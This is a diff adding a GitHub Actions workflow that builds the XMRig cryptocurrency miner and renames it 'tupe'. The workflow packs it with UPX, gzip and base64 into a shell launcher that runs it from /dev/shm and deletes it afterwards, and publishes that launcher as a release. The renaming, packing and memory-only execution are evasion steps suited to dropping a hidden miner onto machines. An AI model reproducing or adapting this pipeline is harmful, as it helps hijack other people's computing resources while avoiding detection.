@@ -1,0 +1,115 @@
+name: Build & Package tupe (Memory-Only)
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@v3
+
+      - name: Build XMRig in Alpine container
+        run: |
+          docker buildx build \
+            --load \
+            --tag xmrig-musl:latest \
+            --file Dockerfile.musl \
+            --target builder \
+            --build-arg BUILD_TYPE=release \
+            .
+
+      - name: Extract binary from container
+        run: |
+          docker create --name xmrig-extractor xmrig-musl:latest
+          docker cp xmrig-extractor:/xmrig/build/xmrig ./tupe
+          docker rm xmrig-extractor
+          chmod +x tupe
+
+      - name: Verify binary
+        run: |
+          file tupe
+          ls -lh tupe
+
+      - name: Install UPX
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq upx-ucl
+
+      - name: Compress with UPX
+        run: |
+          upx -9 ./tupe
+          ls -lh tupe
+
+      - name: Create memory-only launcher script
+        run: |
+          # Create compressed base64 payload
+          BASE64_DATA=$(gzip -9 -c tupe | base64 -w0)
+
+          cat > tupe_run.sh << 'SCRIPT'
+          #!/bin/sh
+          # Memory-only execution: no disk I/O for the binary
+          # Usage: ./tupe_run.sh
+
+          PAYLOAD='PAYLOAD_PLACEHOLDER'
+
+          cleanup() {
+            rm -f /dev/shm/tupe 2>/dev/null
+          }
+
+          trap cleanup EXIT
+
+          # Extract to tmpfs (memory filesystem), not disk
+          echo "$PAYLOAD" | base64 -d | gunzip > /dev/shm/tupe
+          chmod 700 /dev/shm/tupe
+
+          # Execute from memory
+          /dev/shm/tupe "$@"
+
+          exit $?
+          SCRIPT
+
+          # Replace placeholder with actual base64 data
+          sed -i "s/PAYLOAD_PLACEHOLDER/${BASE64_DATA}/" tupe_run.sh
+          chmod +x tupe_run.sh
+
+          # Show final size
+          ls -lh tupe_run.sh
+
+      - name: Test execution in Docker
+        run: |
+          docker run --rm -v $PWD:/app alpine:3.19 sh -c '
+            apk add --no-cache bash coreutils >/dev/null 2>&1
+            cd /app
+            chmod +x tupe_run.sh tupe
+            echo "=== Testing compressed tupe (UPX) ==="
+            timeout 5 ./tupe --help 2>&1 | head -5 || echo "(timeout or no --help)"
+            echo ""
+            echo "=== Testing tupe_run.sh (memory-only) ==="
+            timeout 5 ./tupe_run.sh --version 2>&1 | head -5 || echo "(timeout or no --version)"
+          '
+
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: tupe-memory-runner
+          path: |
+            tupe_run.sh
+            tupe
+          retention-days: 30
+
+      - name: Upload release
+        if: startsWith(github.ref, 'refs/tags/v') || github.event_name == 'release'
+        uses: softprops/action-gh-release@v1
+        with:
+          files: tupe_run.sh
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
